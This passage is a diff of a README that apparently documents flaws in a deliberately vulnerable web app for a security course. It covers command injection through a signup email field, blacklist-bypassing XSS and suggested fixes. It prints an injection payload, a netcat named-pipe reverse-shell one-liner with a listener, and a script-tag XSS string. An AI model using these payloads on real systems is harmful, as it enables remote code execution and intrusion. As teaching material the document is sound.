@@ -17,13 +17,17 @@ Relevant urls:
 
 URL: http://localhost:8080/signup
 
-When registering, the user is instructed to input their account details with an valid email address. This address will be validated against a one-time authorization code (OTAC) sent to the specified address. Email functionality is supposed to be implemented with sendmail, qmail or other mail transfer agent (MTA) executable, but due to the nature of the assignment any mail will not actually be sent.
+When registering, the user is instructed to input their account details with an valid email address. This address will be validated against a one-time authorization code (OTAC) sent to the specified address. Email functionality in `MailService` is supposed to be implemented with sendmail, qmail or other mail transfer agent (MTA) executable, but due to the nature of the assignment any mail will not actually be sent.
 
-The MTA executable is executed with the Java runtime exec() call within a shell environment, so providing an email address with functional shell script as a suffix will execute the script with the runtime privileges. Consider the behaviour to be similar with PHPMailer. The functionality is intended to be cross-platform, so Windows command interpreter injection should also be possible, but I have not tested this.
+The MTA executable is executed with the Java runtime `exec()` call within a shell environment, so providing an email address with functional shell script as a suffix will execute the script with the runtime privileges. Consider the behaviour to be similar with PHPMailer. The functionality is intended to be cross-platform, so Windows command interpreter injection should also be possible, but I have not tested this.
 
 Example email field input sequence for shell: `hello@example.com; touch /tmp/pwned`
 
 Check the /tmp/ directory for the created file to confirm the vulnerability.
+
+**Explanation**: when the `exec()` call is made with the String array `{"/bin/sh", "-c", "echo " + account.getEmail()}` the method will execute `/bin/sh -c echo hello@example.com; touch /tmp/pwned`. The `-c` will set `/bin/sh` to read and evaluate the commands from the argument list, which now is `echo hello@example.com; touch /tmp/pwned`. We can imagine that the `echo` is the MTA executable so this will execute the MTA and the `touch` command in addition, which will create the file `/tmp/pwned`.
+
+This way we can execute any command in the runtime context. We can execute the commands `rm /tmp/shell;mknod /tmp/shell p;nc localhost 10009 0</tmp/shell|/bin/sh 1>/tmp/shell` and in our local machine `nc -v -l 10009`. This will create a reverse shell that will take input as commands and output the command output. This can be used to download and install your own binaries and conduct additional attacks to other hosts in the network. The methods are similar on Windows platforms, but with batch scripting.
 
 **FIX**: make use of Java's JavaMail API functionality or only accept email addresses with a specific pattern ie. `[a-z0-9\.\-\+]+@[a-z0-9]+\.[a-z]+`
 
@@ -39,12 +43,13 @@ After registering, the user will be asked to input the received code. This code 
 
 URL: http://localhost:8080/messages/{username}
 
-After registering, the user has the chance to send messages to other users in the system and to themselves. These messages are intended to have HTML structure, so the HTML encoding has been turned off to introduce the developers own homebrew input validation scheme. It is based on a blacklist of strings that are removed from the message body, so it is easily defeated.
+After registering, the user has the chance to send messages to other users in the system and to themselves. These messages are intended to have HTML structure, so the HTML encoding has been turned off in the Thymeleaf template `messages.html` with the `th:utext` to introduce the developers own homebrew input validation scheme in the service `SanitizerService`. It is based on a blacklist of strings that are removed from the message body, so it is easily defeated.
 
 Example message body: `<sCript>alert('xss!');</sCript>`
 
-**FIX**: With user generated, free-form messages such as these, they should be stored as-is without any modifications to the database. When they are displayed, they should be modified to fit the context of the consumer, in this case the browser. If the messages are transferred to some other medium, such as SMS messages, different sanitation should occur (strip HTML tags etc.).
-In this case the developer could introduce some flavour of markdown formatting which will get rendered to HTML every time a request is made.
+**FIX**: A more quick fix would turn off the grand, homebrew sanitization scheme and use `th:text` in place. Downside is that the message can't have any markup language associated with it anymore. The developer could introduce some flavour of markdown formatting which would get rendered with Thymeleaf in to HTML.
+
+With user generated, free-form messages such as these, they should be stored as-is without any modifications to the database. When they are displayed, they should be modified to fit the context of the consumer, in this case the browser. If the messages are transferred to some other medium, such as SMS messages, the body should be sanitized in the context of a text message (strip HTML tags, shorten urls or insert abbreviations etc.).
 
 ### A4: Indirect user reference
 
